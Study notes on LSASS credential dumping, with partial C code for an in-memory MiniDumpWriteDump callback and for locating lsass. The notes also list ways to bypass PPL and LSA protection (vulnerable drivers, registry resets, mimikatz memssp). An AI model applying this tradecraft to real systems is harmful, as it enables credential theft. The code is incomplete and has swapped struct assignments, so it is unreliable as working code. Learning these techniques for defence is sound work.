LSASS is a post-ex  technique where the attacker can extract the Local Security Aurhtoryt Subsystem Service process memor yto harvest credentials like plaintext passwords, NTLM hashes and kerberos tickets.


# Lsass Func

Lsass.exe is responsible or validating user credentials by communicating with Active Directory (or the SAM database if you're on a stand alone machine) issuing security tokens once you've successfully authenticated.


When you log on, LSASS sends your username & password hash to a domain controller which verifies them against the AD database.

Once this is approved LSASS recieves a security token containing your group memberships and privileges.  That token is then attached to your session and used by every process oyu launch to detemrine what resources you're allowed to access.

Beyond auth, lsass lopads plugablble security support providers, dispatching autentication requests to the approcriate security support provider like kerberos, ntlm , schannel, or digests


It stores credentials and tickets in memory , chacing NTLM hashes and Kerberos tickets for single sign on so users aren't repeatedly prompted.

Legacy credential provides like WDigest even store plaintext secrets or passwords in plaintext. It also interfaces with the SAM decypring and loading hases from `%SystemRoot%\System32\config\SAM` on standalone machines,  and reading the `NTDS.dit` database on domain contontrollers to bring AD credneitlas in to memory when users auth.

# Memory Dumps

A memory dump is a snapshot of the processe's working memory at a specific point in time.

INstead of capturing files on a disk, the memory dump records the contents of RAM.  A memory of lsass gives attackers the oppurtunity to carve out these creds.

There are various different types
1. Full process dump - Captures the entire virtual address space of a single process.
	* `ProcDump` or TaskManager's `Create Dump File` or `Process Hacker's Create Dump File`.
	* `MiniDumpWriteDump `API
2. Mini Dump - Records only a subset of a processes memory
	1. Threads
	2. Stack traces
	3. Minimal heap info
	4. Smaller 
	5. MAY OMIT WHERE CREDS ARE
3. System Crash Dump - Triggered by a kernel exception or manually via system settings.  This captures the memory of the entire operating system. While more heaveyweight a system dump contains copies of all process memories.
	1. https://techcommunity.microsoft.com/blog/askperf/understanding-crash-dump-files/372633


## Dumping a Process

The `MiniDumpWriteDump` API can be used to dump proc memory.  


```c
BOOL MiniDumpWriteDump(

	HADNLE hProcess
	DWORD ProcessID
	HANDLE hFile
	MINIDUMP_TYPE DumpType
	PMINIDUMP_EXCEPTION_INFORMATION UserSTreamParam
	PMINIDUMP_USER_STREAM_INFORMATION UserSTreamParam
	PMINIDUMP_CALLBACK_INFORMATION CallbackParam
)
```

`hProcess` : A process handle to where we're dumping memory.
	* This process handle should be opened with the `PROCESS_QUERY_INFORMATION` flag set and `PROCESS_VM_READ`.
`ProcessID` - can be ignored w a proc handle

`hFile` - output mem dump.  Ignored w `INVALID_HANDLE_VALUE` where no file is created but one nust provide a call back fucntion to recieve the dump data instead.

`DumpType` - A flag to identify the type of the duymp. Type `MINIDUMP` https://techcommunity.microsoft.com/blog/askperf/understanding-crash-dump-files/372633
	Typically use `MiniDumpWithFullMemory` to get all accessible memory.
`ExceptionParam` - A pointer to a `MINIDUMP_EXCEPTION_INFORMATION` structure that contains exception information to be writtent o the dump fiule, can be ingored.
`UserStreamParam`  Pointer to a `MINIDUMP_USER_STREAM_INFORMATION` STRUCt that contains a list of user data streams used by the MiniDUmpWriteDump func that can be ignored.
`CallbackParam` -` Minidump_callback_information` struct that contains a pointer to a callback function `CallbackRoutine` and its optional Paramters `CallbackParam`.

For this example we will ignore the `hFile` handle and provide a `MINIDUMP_CALLBACK_INFORMATION` structure to define a callback function to  be used by the function during the dump process.

Example of the callback inforamtion struct:

```c
typedef struct _MINIDUMP_CALLBACK_INFORMATION{
	MINIDUMP_CALLBACK_ROUTINE CallbackRoutine;
	PVOID CallbackParam
}
```

# DumpProcessMemory Function

To dump a remote processes memory we will make a function to do it.


First allocate a buffer of 64 MB
```c
#define INITIAL_BUFFER_SIZE 1024*1024*64ull // 64MBs 
```

this will exapand later if required.

Then we create our `MINIDUMP_CALLBACK_INFORMATION` and MINIDUMP_CALLBACK_PARAM structs and populate them so they get some allocated memory space assigned.

```
MINIDUMP_CALLBACK_INFORMATION MiniDumpInfo= {0};
MINIDUMP_CALLBACK_PARM MiniDumpParam = {0};
```

Then we will invoke the fucntion passing `INVALID_FILE_HANDLE` for the file handle so that the callback function is invoked and allocated to heap as opposed to disk.  This lets us then parse the memory in C directly as opposed to needing to load it later.

```c


	LPVOID pDumpedMemory = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, INITIAL_BUFFER_SIZE); //allocate memory for the dumped memory

	if (!pDumpedMemory) {
		printf("Error allocating buffer memory for dump...\n");
	}
	//Set up the MiniDumpParam struct...
	MiniDumpParam.dwAllocatedBufferSize = INITIAL_BUFFER_SIZE;
	MiniDumpParam.dwDumpedBufferSize = 0x00;
	MiniDumpParam.pDumpedBuffer = pDumpedMemory;
	
	MiniDumpInfo.CallbackParam = MinidumpCallbackRoutine; //Callback function name
	MiniDumpInfo.CallbackRoutine = &MiniDumpParam;

	if (!MiniDumpWriteDump(hProcess, NULL, INVALID_HANDLE_VALUE, MiniDumpWithFullMemory, NULL, NULL, &MiniDumpInfo)) {
		printf("There was an error with MiniDumpWriteDump... 0x%0.8X\n",GetLastError());
		return FALSE;
	}
	*ppDumpedMemory = MiniDumpParam.pDumpedBuffer;
	*ppcDumpedMemorySize = MiniDumpParam.dwDumpedBufferSize;
```



Then we need to write the callback routine.

```c
MiniDumpInfo.CallbackParam = MinidumpCallbackRoutine; //Callback function name
MiniDumpInfo.CallbackRoutine = &MiniDumpParam; //We can specify the entire MiniDumpParm struct becase WE make the callback so we can have it accept and change values to whatever we want.
```

Here we set the Callback function name, as well as the parameters we intend to pass to it.

```c
BOOL MinidumpCallbackRoutine(
  [in]      PVOID CallbackParam,
  [in]      PMINIDUMP_CALLBACK_INPUT CallbackInput,
  [in, out] PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
```

In this structure for the callback CallbackParm we provide with our `MiniDumpParm` which we intend to populate.

The INPUT struct contains `CallbackType`  which is a [MINIDUMP_CALLBACK_TYPE](https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/ne-minidumpapiset-minidump_callback_type) enumeration that indicates the status of the kernel minidump write attemptand `Io` which indicate the kernel r/w status, and I/O callback info thats useful for us.

The output we really only care about the `Status` field - did it work?


The `MINIDUMP_CALLBACK_INPUT` will tell you where you're at in the dumping process.

`IoStartCallback` - called at the very beginning.  We dont need to change anything thus `CallbackOutput->Status = False;`

The parameters passehe  interested in td to the callback function 

`CallbackInput` info used by the MiniDumpCallback function - interested in two elements.  
1. `MINIDUMP_CALLBACK_TYPE` enum for status of kernel writes
2. `Io` - which is a `MINIDUMP_IO_CALLBACK`  struct that contains the I/O callback information.

CallbackOutput is a pointer to a `MINIDUMP_CALLBACK_OUTPUT` struct that receives application defined info from the callback function.  We are only `Status` element of this structure which represents the status of the current operation and is set based on the value of  the `MINIDUMP_CALLBACK_TYPE` enum.



Here are the Minidump Callback Types:

```
typedef enum _MINIDUMP_CALLBACK_TYPE {
  ModuleCallback,
  ThreadCallback,
  ThreadExCallback,
  IncludeThreadCallback,
  IncludeModuleCallback,
  MemoryCallback,
  CancelCallback,
  WriteKernelMinidumpCallback,
  KernelMinidumpStatusCallback,
  RemoveMemoryCallback,
  IncludeVmRegionCallback,
  IoStartCallback,
  IoWriteAllCallback,
  IoFinishCallback,
  ReadMemoryFailureCallback,
  SecondaryFlagsCallback,
  IsProcessSnapshotCallback,
  VmStartCallback,
  VmQueryCallback,
  VmPreReadCallback,
  VmPostReadCallback
} MINIDUMP_CALLBACK_TYPE;
```

An `enumeration` is esentially a fancy of creating a list and assigning integer values to each in a list.

As the program is running the `minidumpwriter` is calling our callback function MULTIPLE TIMES!!!!! * despite the fact that we only call `MiniDumpWriteDump()` * once.

And so we use all of these CallbakcType values within the `MINIDUMP_CALLBACK_INPUT` struct, specifically the `CallbackType` field, to see WHERE in the execution process the dump writer. We can add specific actions at very specific points in the process:

| Enum Value                     | Meaning                                                             |
| ------------------------------ | ------------------------------------------------------------------- |
| `ModuleCallback`               | Called before writing information about a loaded module (DLL, EXE). |
| `ThreadCallback`               | Called before writing information about a thread.                   |
| `ThreadExCallback`             | Extended thread information.                                        |
| `IncludeThreadCallback`        | Allows you to include or exclude a particular thread.               |
| `IncludeModuleCallback`        | Allows you to include or exclude a particular module.               |
| `MemoryCallback`               | Called when writing specific memory ranges.                         |
| `CancelCallback`               | Lets you stop dump generation entirely.                             |
| `WriteKernelMinidumpCallback`  | When writing a kernel-mode minidump.                                |
| `KernelMinidumpStatusCallback` | Provides status info about kernel dump writing.                     |

MINIDUMP_CALLBACK_INPUT like mentioned the phase of the I/O of the dumping process. BUT we only need three types for an **IN-MEMORY DUMP**

1. `IoStartCallback` - this is triggered ONCE at the beginning of the dump writing process, before any data is emitted.  We dont need to change anything in the way the aprent function `MiniDumpWriteDump()` is runni ng because it really hasnt even started yet, so we set CallbackOutput->Status to S_FALSE and end the callback function execution by returning
2. `IoWriteAllCallback` - triggered repeatedly as the dump engine wants to write each chunk of memory out.  Here we examing the CallbackInput->Io.Offset and `CallbackInput->IoBufferBytes` to calculate where in our preallocated buffer this chunk should go.  Then we copy `CallbackInput->Io.Buffer` to the pre-allocated buffer's base address + `CallbackInput->Offset`. Now we set `CallbackOutput->Status` to `S_OK`
3. `IoFinishCalllback` - Triggered after all of the `IoWriteAllCallback` cases are executed , the memdump is complet.  `CallbackOutput->Status` = S_OK.
#### The MINIDUMP_IO_CALLBACK Structure

Inside of `PMINIDUMP_CALLBACK_INPUT` here is the typedef:

```
typedef struct _MINIDUMP_IO_CALLBACK{
	HANDLE Handle;
	ULONG64 Offset;
	PVOID Buffer;
	ULONG BufferBytes;
} _MINIDUMP_IO_CALLBACK, *PMINIDUMP_IO_CALLBACK;*
```


Unlike `MINIDUMP_CALLBACK_TYPE` which tells you where wholistically you're at in the dumping process, this is more lower level.  `_MINIDUMP_IO_CALLBACK` is more about the actual bytes you're reading from memory.


____
 
I'd love to get a module handle to lsass via syscall.

First we need define a pointer to the function since we're pulling it out of ntdll and its not native to windows.h

```c
int main() {
	

	//We need this function definition because NtQuerySystemInformation isnt native to the WINAPI.
	//We're defining a new type, a pointer to a function.
	//Return type is NTSTATUS which is standard for syscalls.
	typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass, //#include <winternl.h>
		PVOID                    SystemInformation,
		ULONG                    SystemInformationLength,
		PULONG                   ReturnLength
		);
		......
```
Note:

`SystemInformationClass` - Decides what type of system information the function returns
`SystemInformation` - A pointer to a buffer that will receive the requested information.  Requested info will be in a struct of type specified in `SystemInformationClass`
`SystemInformationLength` - Size of buffer pointed to by `SystemInformation`
`ReturnLength` pointer to a  ULONG that will receive the actual size of inforamtion written to `SystemInformation`.

https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation#systemprocessinformation


#### SystemProcessInformation

Returns an array of **SYSTEM_PROCESS_INFORMATION** structures, one for each process running in the system.

Thats what we want to use.

These structures contain information about the resource usage of each process, including the number of threads and handles used by the process, the peak page-file usage, and the number of memory pages that the process has allocated.

What is that `SYSTEM_PROCESS_INFORMATION` struct?


https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation#system_process_information


```c
typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    BYTE Reserved1[48];
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    PVOID Reserved2;
    ULONG HandleCount;
    ULONG SessionId;
    PVOID Reserved3;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG Reserved4;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    PVOID Reserved5;
    SIZE_T QuotaPagedPoolUsage;
    PVOID Reserved6;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved7[6];
} SYSTEM_PROCESS_INFORMATION;
```

This means that when we set the `SystemInformationClass` parameter to `SystemProcessInformation` , the buffer will point to a struct that contains this data for EACH process on the host.


These structures is followed immedieatly by one or more `SYSTEM_THREAD_INFORMATION` structures that provides info on each thread in a preceding process.

The start of the next item in the array is the address of the previous item plus the value in the **NextEntryOffset** member. For the last item in the array, **NextEntryOffset** is 0.

The **`UniqueProcessId`** member contains the process's unique process ID.
```
    UNICODE_STRING ImageName; -> UNICODE string of proc name
    UniqueProcessId -> PID
```

Conviniently the two things that we need to open a process handle :)

So lets do this.


Then we define the vairable that will hold this.

```c
fnNtQuerySystemInformation pNtQuerySystemInformation = NULL;
```

Now we need to 


# The Dump File

minidump files signature is `MDMP`

![[Pasted image 20250814205843.png]]


# Raw memory dump?

`DumpProcessMemory2` can get a raw full dump utilizing `VirtualQueryEx` & `ReadProcessMemory`

Needs:
* hProcess
* bExcludeModules -> include or disinclude dlls from memory
* ppDumpedMemory -> Pointer toa  PVOID var that will recieve the base addr of the dump.
* ppcDumpedMemorySize -> pointer to SIZE_T var that recieves the size of the dump

# Protected Process Light (PPL)

PPL is an extension of the protected process mechanism introducted in Windows 8.1 to harden  crtiical system procs like `lsass`.  Under PPL a process is assigned a protection level and a signer type in its kernel process object (within the `EPROCESS.Protection` field ) This designation creates a boundary - non protected processes (including those from ADministrator and NT AUTHORITY\SYSTEM) cannot freely open handles to a PPL process.


If an unprotected process wants to access the memory of a PPL process it can **ONLY** do so with rihgts like **`PROCESS_QUERY_LIMITED_INFORMATION`**. 

```
typedef struct _PS_PROTECTION {
    union {
        UCHAR Level;
        struct {
            UCHAR Type   : 3;  // Protection type (0–2)
            UCHAR Audit  : 1;  // Audit-only flag
            UCHAR Signer : 4;  // Signature type (0–8)
        };
    };
} PS_PROTECTION;
```

When LSA Protection is enabled `lsass.exe` is launched as a PPL process with an LSA signer.

The type is `PsProtectedTypeProtectedLight`, the signer is `PsProtectedSignerLsa`. The level is calculated as `(4 << 4) | 1`, which means LSASS’s `EPROCESS.Protection.Level` will read as `0x41`.

This means only processes with a PPL level greater can access

 
 Examples include Windows procs w  value 5, WinTcb with value 6, WinSystem with value 7, or App with value 8

# Bypassing PPL

1. Kernel MOde Driver Attack
	- example: mimikatz uses mimidrv.sys
- BYOD
	- Loading a legit but vulnerable signed driver
	- Tools like PPLKiller exploit vulnerable drivers to run code in kernel mode and then inject or attach to LSASS.
- Handle Duplication
	- There are processes with legitmate handles to lsass like AV or system procs.  You can read their pocess memory and duplicate the handle, but this is not possible in Windows 11 which blocks and duplication of the lsass handle.
# LSA Protection

Refered to by registry name of `RunAsPPL` -> specific application of the PPL model dedicated to the lsass.exe process.

When LSA protection is enabled the system launches lsass as a PPL with a special signer, (the “LSA” signer, represented internally as `PsProtectedSignerLsa-Light`)​. In effect, LSASS becomes a protected process light, and the operating system will prevent non-protected processes from reading its memory or injecting code into it.

The reg value `RunAsPPL` is located under: `HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Lsa`

- `0` - LSA protection disabled.
    
- `1` - PPL enabled with a UEFI-backed lock (the setting is stored in firmware and can’t be reverted via the registry).
    
- `2` - PPL enabled without a UEFI lock (stored only in the registry; this is the default on clean installs of Windows 11 22H2 and later).
    

However, there is another registry value that also relates to the LSA protection, which is `RunAsPPLBoot`. This is a secondary `REG_DWORD` in the same key that signals the OS to launch LSASS as PPL at boot, mirroring the mode chosen by `RunAsPPL`. Its valid settings are:

- `0` - Disable boot-time enforcement. LSASS may only transition to PPL later (or not at all), and Windows Security will typically report the feature as off, even if `RunAsPPL` is set.
    
- `2` - Enable PPL enforcement at boot. `RunAsPPLBoot` must be set to `2` alongside `RunAsPPL=1` (UEFI-locked) or `RunAsPPL=2` (registry-only) to ensure LSASS is protected from the moment the service starts
    

Resetting these values to `0` reverts LSASS to an unprotected process, allowing tools to open handles and dump its memory. But such registry changes are often logged or trigger alerts in modern endpoint protection solutions.


# Credential Guard

Introduced in Win10.  Instead of relying on process level protections Credneital GUard uses virtualization. Based Security.

lsass secrets are no longer stored in lsass itself.  Lsass interacts with a seperate process called LSAISO.exe, which runs in a protected virtual environment and holds all sensitive data.


`LSAIso.exe` is a trustlet whjich runs in the secure world , as a usermode process, under governance of the secure kernel:

![[Pasted image 20250814211205.png]]

When lsass needs info it makes an RPC call to LSAIso.exe.

https://blog.nviso.eu/2018/01/09/windows-credential-guard-mimikatz/


![Credential Guard](https://blog.nviso.eu/wp-content/uploads/2018/01/screen-shot-2018-01-09-at-11-41-22.png)



Mimikatz can still get creds through SP's though (security support providers) - these are packages that assist in the authentication of users and will retain credentiais.  Windows comes with many and more can be installed w Admin privileges.

the `memssp` command installs a custom SSP in memory that will log all credneitlas to a text file.
![[Pasted image 20250814211644.png]]

